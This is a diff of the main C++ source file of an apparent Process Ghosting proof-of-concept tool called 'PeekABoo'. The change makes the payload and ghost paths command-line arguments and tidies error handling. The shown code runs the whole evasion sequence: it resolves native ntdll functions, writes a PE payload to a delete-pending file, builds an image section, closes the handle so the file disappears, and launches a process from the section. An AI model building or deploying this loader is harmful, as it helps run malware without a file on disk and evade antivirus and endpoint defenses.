@@ -1,4 +1,5 @@
 #include "Common.hpp"
+#include "ErrorHandler.hpp"
 #include "PayloadManager.hpp"
 #include "FileGhoster.hpp"
 #include "SectionManager.hpp"
@@ -6,47 +7,57 @@
 #include <iostream>
 #include <string>
 
+static void PrintUsage(const char *argv0)
+{
+    std::cerr << "Usage: " << argv0 << " <payload.exe> [ghost_path]" << std::endl;
+    std::cerr << "  payload.exe  Path to the PE file to ghost-execute." << std::endl;
+    std::cerr << "  ghost_path   Temp path for the ghost file (default: C:\\Windows\\Temp\\ghost_payload.bin)" << std::endl;
+}
+
 int main(int argc, char *argv[])
 {
-    // 1. Configuration
-    // Change this to the path of your target PE file
-    std::string payloadPath = "payload.exe";
-    std::wstring ghostFilePath = L"C:\\Windows\\Temp\\ghost_payload.bin";
+    if (argc < 2)
+    {
+        PrintUsage(argv[0]);
+        return 1;
+    }
 
-    std::cout << "[*] Initializing Process Ghosting PoC..." << std::endl;
+    std::string payloadPath = argv[1];
+    std::wstring ghostFilePath = (argc >= 3)
+        ? std::wstring(argv[2], argv[2] + strlen(argv[2]))
+        : L"C:\\Windows\\Temp\\ghost_payload.bin";
 
-    // 2. Resolve Native APIs from ntdll.dll
+    std::cout << "[*] PeekABoo — Process Ghosting PoC" << std::endl;
+    std::cout << "[*] Payload : " << payloadPath << std::endl;
+
+    // 1. Resolve Native APIs from ntdll.dll
     if (!DynamicNT::Instance().Initialize())
     {
-        std::cerr << "[-] Failed to resolve NTAPI functions. Exiting." << std::endl;
+        std::cerr << "[-] Failed to resolve NTAPI functions." << std::endl;
         return 1;
     }
-    std::cout << "[+] NTAPI functions resolved successfully." << std::endl;
+    std::cout << "[+] NTAPI functions resolved." << std::endl;
 
-    // 3. Load and Validate Payload
+    // 2. Load and validate payload
     std::vector<uint8_t> payload = PayloadManager::LoadPayload(payloadPath);
     if (payload.empty())
-    {
-        std::cerr << "[-] Could not load payload file." << std::endl;
         return 1;
-    }
 
     if (!PayloadManager::ValidatePE(payload))
-    {
-        std::cerr << "[-] Payload is not a valid PE file." << std::endl;
         return 1;
-    }
 
     uint32_t entryPoint = PayloadManager::GetEntryPoint(payload);
-    std::cout << "[+] Payload validated. Entry Point RVA: 0x" << std::hex << entryPoint << std::dec << std::endl;
-
-    // 4. Create Ghost File and Write Payload
-    // This creates the file and marks it for deletion
-    HANDLE hGhostFile = FileGhoster::CreateGhostFile(ghostFilePath);
-    if (hGhostFile == INVALID_HANDLE_VALUE)
+    if (!entryPoint)
     {
+        std::cerr << "[-] Could not determine entry point." << std::endl;
         return 1;
     }
+    std::cout << "[+] Payload validated. Entry point RVA: 0x" << std::hex << entryPoint << std::dec << std::endl;
+
+    // 3. Create ghost file and write payload
+    HANDLE hGhostFile = FileGhoster::CreateGhostFile(ghostFilePath);
+    if (hGhostFile == INVALID_HANDLE_VALUE)
+        return 1;
 
     if (!FileGhoster::WritePayloadToFile(hGhostFile, payload))
     {
@@ -54,8 +65,7 @@ int main(int argc, char *argv[])
         return 1;
     }
 
-    // 5. Create Image Section
-    // We must do this while the file handle is still open
+    // 4. Create image section while the file handle is still open
     HANDLE hSection = SectionManager::CreateImageSection(hGhostFile);
     if (!hSection)
     {
@@ -63,31 +73,20 @@ int main(int argc, char *argv[])
         return 1;
     }
 
-    // 6. TRIGGER GHOSTING: Close the file handle
-    // Because the file was marked for deletion, closing the handle now
-    // removes the file from the disk. The section handle still maintains
-    // a reference to the data in memory.
+    // 5. Close the file handle — triggers deletion, ghosting begins
     FileGhoster::CloseGhostFile(hGhostFile);
 
-    // 7. Execute the Payload
-    // This creates the process and thread from the remaining memory section
-    if (ProcessExecutor::Run(hSection, entryPoint, ghostFilePath))
-    {
-        std::cout << "[***] Process Ghosting successful! Payload is running." << std::endl;
-    }
+    // 6. Create process, write PEB parameters, create thread, and resume
+    bool success = ProcessExecutor::Run(hSection, entryPoint, ghostFilePath);
+    ErrorHandler::SafeCloseHandle(hSection);
+
+    if (success)
+        std::cout << "[+] Process Ghosting successful. Payload is running." << std::endl;
     else
-    {
         std::cerr << "[-] Payload execution failed." << std::endl;
-    }
 
-    // Cleanup section handle
-    if (hSection)
-    {
-        CloseHandle(hSection);
-    }
-
-    std::cout << "[*] Execution complete. Press Enter to exit..." << std::endl;
+    std::cout << "[*] Press Enter to exit..." << std::endl;
     std::cin.get();
 
-    return 0;
+    return success ? 0 : 1;
 }
